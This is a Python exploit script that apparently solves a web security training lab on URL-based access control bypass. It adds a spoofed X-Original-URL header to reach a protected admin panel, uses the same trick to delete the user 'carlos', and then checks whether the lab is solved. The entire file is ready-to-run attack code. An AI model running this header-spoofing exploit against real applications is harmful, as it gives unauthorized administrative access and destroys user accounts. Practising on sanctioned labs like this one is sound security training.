# URL-based access control can be circumvented

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def find_admin_panel(s, url):
	print('\n[+] Searching admin panel adding X-Original-URL header...')
	headers = {'X-Original-URL': '/admin'}
	r = s.get(url, headers=headers)
	time.sleep(1)
	if r.status_code == 200 and '/admin/delete?username=' in r.text:
		print('[+] Found admin panel !\n')
	return r

def delete_carlos(s, url):
	print('[+] Trying to delete Carlos user adding X-Original-URL header...')
	delete_headers = {'X-Original-URL': '/admin/delete'}
	delete_path = url + '/?username=carlos'
	r = s.get(delete_path, headers=delete_headers)
	time.sleep(1)
	print('[+] Checking that Carlos user have been removed...')
	r = find_admin_panel(s, url)
	if not 'carlos' in r.text:
		print('[+] Successfully removed Carlos user !')
	else:
		print('[-] Exploit failed to remove Carlos user !!!')
		sys.exit(1)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: URL-based access control can be circumvented')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find Unprotected admin panel...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			time.sleep(2)
			r = find_admin_panel(s, url)
			r = delete_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
